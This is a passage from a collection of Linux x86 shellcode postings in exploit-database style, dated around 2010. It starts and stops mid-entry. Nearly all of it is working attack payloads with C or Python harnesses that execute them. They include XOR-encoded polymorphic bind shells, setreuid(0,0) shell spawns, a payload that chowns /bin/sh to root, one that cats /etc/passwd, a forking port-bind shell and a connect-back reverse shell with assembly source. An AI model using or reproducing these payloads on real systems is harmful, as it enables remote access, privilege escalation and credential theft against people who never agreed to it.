		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xec\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x6d"                        /* insl   (%dx),%es:(%edi) */
		"\x65\x64\x69\x61\x2f\x64\x69"/* imul $0x6b736964,%fs:%gs:0x2f(%ecx),%esp */
		"\x73\x6b";

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 48 bytes chown root:root /bin/sh x86 linux shellcode
Date   : Sat Jun  5 15:32:40 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x13"                    /* jmp    0x8048075 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\xb6"                    /* mov    $0xb6,%al */
		"\x5b"                        /* pop    %ebx */
		"\x31\xc9"                    /* xor    %ecx,%ecx */
		"\x31\xd2"                    /* xor    %edx,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xe8\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x68\x6f\x6d\x65\x2f"        /* push   $0x2f656d6f */
		"\x67\x75\x6e"                /* addr16 jne 0x80480f1 */
		"\x73\x6c"                    /* jae    0x80480f1 */
		"\x69\x6e\x67\x65\x72\x2f\x73"/* imul   $0x732f7265,0x67(%esi),%ebp */
		"\x68"                        /* .byte 0x68 */
		"\x65"                        /* gs */
		"\x6c"                        /* insb   (%dx),%es		"(%edi) */
		"\x6c";                       /* insb   (%dx),%es		"(%edi) */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 46 bytes cdrom ejecting x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : ubuntu linux
*/

char sc[] = 	"\x6a\x0b\x58\x99\x52"
		"\x6a\x6d\x68\x63\x64"
		"\x72\x6f\x89\xe1\x52"
		"\x66\x68\x63\x74\x68"
		"\x2f\x65\x6a\x65\x68"
		"\x2f\x62\x69\x6e\x68"
		"\x2f\x75\x73\x72\x89"
		"\xe3\x52\x51\x53\x89"
		"\xe1\xcd\x80\x40\xcd"
		"\x80";

int main(void)
{
	(*(void(*)()) sc)();
     
return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title  : bind port to 6678 XOR encoded polymorphic linux shellcode .
Name   : 125 bind port to 6678 XOR encoded polymorphic linux shellcode .
Date   : Tue Jul  6 01:52:33 WIT 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
		    mywisdom (devilzc0de.org), loneferret (offensive-security.com)
greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/
 
#include <stdio.h>
 
char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x65\x80\x74\x0e\xff"
           	   "\x0a\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff"
           	   "\xff\xff\x3b\xca\x3b\xd1\x3b\xd8\x5a\x60\x0b"
           	   "\x60\x08\x83\xeb\xf4\xc9\xba\x6c\xc7\x8a\x83"
           	   "\xcc\x58\x62\xb1\x08\x10\x70\x83\xeb\x60\x1a"
           	   "\x5b\x5c\x83\xeb\xf4\xc9\xba\x6c\xc7\x8a\x58"
           	   "\x5c\x83\xeb\xb9\x0e\xba\x6c\xc7\x8a\x58\x58"
           	   "\x5c\x83\xeb\xf4\xc9\xba\x6c\xc7\x8a\x83\xc9"
           	   "\x3b\xc3\xba\x35\xc7\x8a\x4b\xba\x35\xc7\x8a"
           	   "\x4b\xba\x35\xc7\x8a\x58\x62\x25\x25\x79\x62"
           	   "\x62\x25\x68\x63\x64\x83\xe9\x58\x59\x83\xeb"
           	   "\xba\x01\xc7\x8a";
 
         
int main(void)
{
    fprintf(stdout,"Length: %d\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : Polymorphic shellcode that bindport to 31337 with setreuid (0,0) x86 linux shellcode.
Name   : 131 bytes bind port 31337 x86 linux polymorphic shellcode.
Date   : Sat Jun  17 21:27:03 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
                    mywisdom (devilzc0de.org), loneferret (offensive-security.com) 
                    greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/

#include <stdio.h>

char bindport[] = "\xeb\x11\x5e\x31\xc9\xb1\x6b\x80\x6c\x0e\xff\x35\x80\xe9\x01"
		  "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\xe5\x7b\xbd\x0e\x02\xb5"
		  "\x66\xf5\x66\x10\x66\x07\x85\x9f\x36\x9f\x37\xbe\x16\x33\xf8"
		  "\xe5\x9b\x02\xb5\xbe\xfb\x87\x9d\xf0\x37\xaf\x9e\xbe\x16\x9f"
		  "\x45\x86\x8b\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\x87\x8b\xbe\x16"
		  "\xe8\x39\xe5\x9b\x02\xb5\x87\x87\x8b\xbe\x16\x33\xf8\xe5\x9b"
		  "\x02\xb5\xbe\xf8\x66\xfe\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5"
		  "\x76\xe5\x74\x02\xb5\x87\x9d\x64\x64\xa8\x9d\x9d\x64\x97\x9e"
		  "\xa3\xbe\x18\x87\x88\xbe\x16\xe5\x40\x02\xb5";

int main(void)
{
	fprintf(stdout,"Length: %d\n",strlen(bindport));
	(*(void(*)()) bindport)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : Polymorphic shellcode that bindport to 13123 x86 linux shellcode.
Name   : 125 bytes bind port 13123 x86 linux polymorphic shellcode.
Date   : Sat Jun  17 21:27:03 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), 
                           mywisdom (devilzc0de.org), loneferret (offensive-security.com)
                           greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/

#include <stdio.h>

char bindport[] = "\xeb\x11\x5e\x31\xc9\xb1\x65\x80\x6c\x0e\xff\x35\x80\xe9\x01"
		  "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x66\xf5\x66\x10\x66\x07"
		  "\x85\x9f\x36\x9f\x37\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xfb"
		  "\x87\x9d\xf0\x37\x68\x78\xbe\x16\x9f\x45\x86\x8b\xbe\x16\x33"
		  "\xf8\xe5\x9b\x02\xb5\x87\x8b\xbe\x16\xe8\x39\xe5\x9b\x02\xb5"
		  "\x87\x87\x8b\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xf8\x66\xfe"
		  "\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x87"
		  "\x9d\x64\x64\xa8\x9d\x9d\x64\x97\x9e\xa3\xbe\x18\x87\x88\xbe"
		  "\x16\xe5\x40\x02\xb5";

int main(void)
{
	//fprintf(stdout,"Length: %d\n",strlen(bindport));
	(*(void(*)()) bindport)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title  : Find all writeable folder in filesystem linux polymorphic shellcode .
Name   : 91 bytes Find all writeable folder in filesystem linux polymorphic shellcode .
Date   : Sat Jun  17 21:27:03 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
		    mywisdom (devilzc0de.org), loneferret (offensive-security.com)
greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/
 
#include <stdio.h>
 
char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x43\x80\x6c\x0e\xff\x35\x80\xe9\x01"
                   "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x95\x66\xf5\x66\x07\xe5"
                   "\x40\x87\x9d\xa3\x64\xa8\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87"
                   "\x9d\x62\x98\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02"
                   "\xb5\x96\x1d\x29\x34\x34\x34\x9b\x9e\xa3\x99\x55\x64\x55\x62"
                   "\xa9\xae\xa5\x9a\x55\x99\x55\x62\xa5\x9a\xa7\xa2\x55\x6c\x6c"
                   "\x6c";
         
int main(void)
{
    fprintf(stdout,"Length: %d\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
*linux/x86 execve()51bytes
* 08048080 <_start>:
* 8048080: eb 1a jmp 804809c
* 08048082 :
* 8048082: 5e pop %esi
* 8048083: 31 c0 xor %eax,%eax
* 8048085: 88 46 07 mov %al,0x7(%esi)
* 8048088: 8d 1e lea (%esi),%ebx
* 804808a: 89 5e 08 mov %ebx,0x8(%esi)
* 804808d: 89 46 0c mov %eax,0xc(%esi)
* 8048090: b0 0b mov $0xb,%al
* 8048092: 89 f3 mov %esi,%ebx
* 8048094: 8d 4e 08 lea 0x8(%esi),%ecx
* 8048097: 8d 4e 0c lea 0xc(%esi),%ecx
* 804809a: cd 80 int $0x80
* 0804809c :
* 804809c: e8 e1 ff ff ff call 8048082
* 80480a1: 2f das
* 80480a2: 62 69 6e bound %ebp,0x6e(%ecx)
* 80480a5: 2f das
* 80480a6: 73 68 jae 8048110
* 80480a8: 4a dec %edx
* 80480a9: 41 inc %ecx
* 80480aa: 41 inc %ecx
* 80480ab: 41 inc %ecx
* 80480ac: 41 inc %ecx
* 80480ad: 4b dec %ebx
* 80480ae: 4b dec %ebx
* 80480af: 4b dec %ebx
* 80480b0: 4b dec %ebx
*/
#include<stdio.h>
char shellcode[]="\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d"
"\x1e\x89\x5e\x08\x89\x46"
"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
"\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41"
"\x4b\x4b\x4b\x4b";
main()
{ void (*routine)();
routine=&shellcode;
printf("size of shellcode: %dbytes\n",sizeof(shellcode));
routine();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
 
const char shellcode[]="\x31\xc0" // xorl %eax,%eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x63\x61\x74" // push dword 0x7461632f
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69622f
"\x89\xe3" // mov ebx,esp
"\x52" // push edx
"\x68\x73\x73\x77\x64" // pu sh dword 0x64777373
"\x68\x2f\x2f\x70\x61" // push dword 0x61702f2f
"\x68\x2f\x65\x74\x63" // push dword 0x6374652f
"\x89\xe1" // mov ecx,esp
"\xb0\x0b" // mov $0xb,%al
"\x52" // push edx
"\x51" // push ecx
"\x53" // push ebx
"\x89\xe1" // mov ecx,esp
"\xcd\x80" ; // int 80h
 
int main()
{
(*(void (*)()) shellcode)();
 
return 0;
}
 
 
/*
shellcode[]=	"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64" 
		"\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
*/



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title: Linux x86 setreuid (0,0) & execve("/bin/ash",NULL,NULL) + XOR encoded - 58 bytes
# Author: egeektronic <info (at) egeektronic {dot} com>
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono 

from ctypes import *

shell = "\xeb\x0d\x5e\x31\xc9\xb1\x26\x80\x36\x19\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x28\xd9\x28\xc2\x28\xd0\x28\xcb\xa9\x5f\x28\xc2\x28\xd0\xd4\x99\xa9\x12\x4a\x71\x36\x78\x6a\x71\x71\x36\x7b\x70\x77\x90\xfa\x28\xd0\x28\xd0\x4a\xd4\x99"

memory = create_string_buffer(shell, len(shell))

shellcode = cast(memory, CFUNCTYPE(c_void_p))

shellcode()



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title: Linux x86 setreuid (0,0) & execve("/bin/ksh", ["/bin/ksh", NULL]) + XOR encoded - 53 bytes
# Author: egeektronic <info (at) egeektronic {dot} com>
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono

from ctypes import *

shell = "\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x7c\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x16\x3a\x24\x4d\xa7\x4d\xb5\xb1\xfc\x4d\xae\x16\x77\x24\x2e\x14\x53\x17\x0f\x14\x14\x53\x1e\x15\x12\xf5\x9f\x2e\x2f\xf5\x9d\xb1\xfc"

memory = create_string_buffer(shell, len(shell))

shellcode = cast(memory, CFUNCTYPE(c_void_p))

shellcode()



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title: Linux x86 setreuid (0,0) & execve("/bin/csh", ["/bin/csh", NULL]) + XOR encoded - 53 bytes
# Author: egeektronic <info (at) egeektronic {dot} com>
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono

from ctypes import *

shell = "\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x7c\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x16\x3a\x24\x4d\xa7\x4d\xb5\xb1\xfc\x4d\xae\x16\x77\x24\x2e\x14\x53\x1f\x0f\x14\x14\x53\x1e\x15\x12\xf5\x9f\x2e\x2f\xf5\x9d\xb1\xfc"

memory = create_string_buffer(shell, len(shell))

shellcode = cast(memory, CFUNCTYPE(c_void_p))

shellcode()



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title: Linux x86 setreuid (0,0) & execve("/bin/zsh", ["/bin/zsh", NULL]) + XOR encoded - 53 bytes
# Author: egeektronic <info (at) egeektronic {dot} com>
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono

from ctypes import *

shell = "\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x35\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x5f\x73\x6d\x04\xee\x04\xfc\xf8\xb5\x04\xe7\x5f\x3e\x6d\x67\x5d\x1a\x4f\x46\x5d\x5d\x1a\x57\x5c\x5b\xbc\xd6\x67\x66\xbc\xd4\xf8\xb5"

memory = create_string_buffer(shell, len(shell))

shellcode = cast(memory, CFUNCTYPE(c_void_p))

shellcode()



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* linux x86 shellcode by eSDee of Netric (www.netric.org)
 * 200 byte - forking portbind shellcode - port=0xb0ef(45295)
 */     

#include <stdio.h>

char
main[] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc1\x31\xc0\x31\xdb\x50\x50"
        "\x50\x66\x68\xb0\xef\xb3\x02\x66"
        "\x53\x89\xe2\xb3\x10\x53\xb3\x02"
        "\x52\x51\x89\xca\x89\xe1\xb0\x66"
        "\xcd\x80\x31\xdb\x39\xc3\x74\x05"
        "\x31\xc0\x40\xcd\x80\x31\xc0\x50"
        "\x52\x89\xe1\xb3\x04\xb0\x66\xcd"
        "\x80\x89\xd7\x31\xc0\x31\xdb\x31"
        "\xc9\xb3\x11\xb1\x01\xb0\x30\xcd"
        "\x80\x31\xc0\x31\xdb\x50\x50\x57"
        "\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
        "\x89\xc6\x31\xc0\x31\xdb\xb0\x02"
        "\xcd\x80\x39\xc3\x75\x40\x31\xc0"
        "\x89\xfb\xb0\x06\xcd\x80\x31\xc0"
        "\x31\xc9\x89\xf3\xb0\x3f\xcd\x80"
        "\x31\xc0\x41\xb0\x3f\xcd\x80\x31"
        "\xc0\x41\xb0\x3f\xcd\x80\x31\xc0"
        "\x50\x68\x2f\x2f\x73\x68\x68\x2f"
        "\x62\x69\x6e\x89\xe3\x8b\x54\x24"
        "\x08\x50\x53\x89\xe1\xb0\x0b\xcd"
        "\x80\x31\xc0\x40\xcd\x80\x31\xc0"
        "\x89\xf3\xb0\x06\xcd\x80\xeb\x99";


int
c_code()
{
        char *argv[2];
        char *sockaddr =  "\x02\x00"             //  Address family
                          "\xb0\xef"             //  port
                          "\x00\x00\x00\x00"
                          "\x00\x00\x00\x00"
                          "\x00\x00\x00\x00";

        int sock        = 0;
        int new_sock    = 0;
        int a           = 16;

        sock = socket(2, 1, 6);
        if (bind(sock, sockaddr, 16) != 0) exit();
        listen(sock, 0);

        signal(17, 1);

        while(1) {

                new_sock = accept(sock, 0, 0);

                if (fork() == 0) {
                        close(sock);
                        dup2(new_sock, 0);
                        dup2(new_sock, 1);
                        dup2(new_sock, 2);
                        argv[0] = "//bin/sh";
                        argv[1] = NULL;
                        execve(argv[0], &argv[0], NULL);
                        exit();
                }

                close(new_sock);
        }

}


int
asm_code()
{
        __asm(" # sock = socket(2, 1, 6);
                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                xorl    %ecx,   %ecx
                pushl   %ecx
                movb    $6,     %cl             # IPPROTO_TCP
                pushl   %ecx
                movb    $1,     %cl             # SOCK_STREAM
                pushl   %ecx
                movb    $2,     %cl             # AF_INET
                pushl   %ecx
                movl    %esp,   %ecx
                movb    $1,     %bl             # SYS_SOCKET
                movb    $102,   %al             # SYS_socketcall
                int     $0x80           
                movl    %eax,   %ecx

                # if (bind(sock, sockaddr, 16) != 0) exit();
                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                pushl   %eax
                pushl   %eax
                pushl   %eax
                pushw   $0xefb0                 # port
                movb    $0x02,  %bl             # address family
                pushw   %bx
                movl    %esp,   %edx
                movb    $16,    %bl
                pushl   %ebx                    # 16
                movb    $2,     %bl             # SYS_BIND
                pushl   %edx
                pushl   %ecx                    # sock
                movl    %ecx,   %edx
                movl    %esp,   %ecx
                movb    $102,   %al             # SYS_socketcall
                int     $0x80
                xorl    %ebx,   %ebx
                cmpl    %eax,   %ebx
                je      SKIP_EXIT
                xorl    %eax,   %eax
                incl    %eax                    # SYS_exit
                int     $0x80 
                SKIP_EXIT:

                # listen(sock, 0);              
                xorl    %eax,   %eax
                pushl   %eax
                pushl   %edx                    # sock
                movl    %esp,   %ecx
                movb    $4,     %bl             # SYS_LISTEN
                movb    $102,   %al             # SYS_socketcall
                int     $0x80
                movl    %edx,   %edi

                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                xorl    %ecx,   %ecx
                movb    $17,    %bl             # SIGCHLD
                movb    $1,     %cl             # SIG_IGN
                movb    $48,    %al             # SYS_signal
                int     $0x80

                # while(1);
                WHILE:
                        # new_sock = accept(sock, 0, 0);
                        xorl    %eax,   %eax
                        xorl    %ebx,   %ebx
                        pushl   %eax
                        pushl   %eax
                        pushl   %edi                    # sock
                        movl    %esp,   %ecx
                        movb    $5,     %bl             # SYS_ACCEPT
                        movb    $102,   %al             # SYS_socketcall
                        int     $0x80
                        movl    %eax,   %esi            # new_sock

                        # if (fork() == 0) {

                        xorl    %eax,   %eax
                        xorl    %ebx,   %ebx
                        movb    $2,     %al             # SYS_fork
                        int     $0x80
                        cmpl    %eax,   %ebx
                        jne CLOSE_NEWSOCK

                                # close(sock);
                                xorl    %eax,   %eax
                                movl    %edi,   %ebx    # sock
                                movb    $6,     %al     # SYS_close
                                int $0x80

                                # dup2(new_sock, 0);
                                xorl    %eax,   %eax
                                xorl    %ecx,   %ecx    # stdin
                                movl    %esi,   %ebx    # new_sock
                                movb    $63,    %al     # SYS_dup2
                                int     $0x80

                                # dup2(new_sock, 1);
                                xorl    %eax,   %eax
                                incl    %ecx            # stdout
                                movb    $63,    %al     # SYS_dup2
                                int     $0x80

                                # dup2(new_sock, 3);
                                xorl    %eax,   %eax
                                incl    %ecx            # stderr
                                movb    $63,    %al     # SYS_dup2
                                int     $0x80

                                # execve(argv[0], &argv[0], NULL);
                                xorl    %eax,   %eax
                                pushl   %eax
                                pushl   $0x68732f2f
                                pushl   $0x6e69622f
                                movl    %esp,   %ebx    # //bin/sh
                                movl    8(%esp),%edx
                                pushl   %eax
                                pushl   %ebx
                                movl    %esp,   %ecx
                                movb    $0xb,   %al
                                int     $0x80           # SYS_execve

                                # exit()
                                xorl    %eax,   %eax
                                incl    %eax            # SYS_exit
                                int     $0x80
                        CLOSE_NEWSOCK:

                        # close(newsock);
                        xorl    %eax,   %eax
                        movl    %esi,   %ebx    # newsock
                        movb    $6,     %al     # SYS_close
                        int $0x80

                jmp WHILE ");


}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* linux x86 shellcode by eSDee of Netric (www.netric.org)
 * 131 byte - connect back shellcode (port=0xb0ef)
 */     

#include <stdio.h>

char
shellcode[] = 
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";

int
c_code()
{
        char *argv[2];
        char *sockaddr = "\x02\x00"             //  Address family
                         "\xef\xb0"             //  port
                         "\x00\x00\x00\x00"     //  sin_addr
                         "\x00\x00\x00\x00"
                         "\x00\x00\x00\x00";

        int sock;

        sock = socket(2, 1, 6);
        if (connect(sock, sockaddr, 16) < 0) exit();

        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        argv[0] = "//bin/sh";
        argv[1] = NULL;

        execve(argv[0], &argv[0], NULL);
        exit();
}

int
asm_code()
{
        __asm(" # sock = socket(2, 1, 6);
                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                xorl    %ecx,   %ecx
                pushl   %ecx
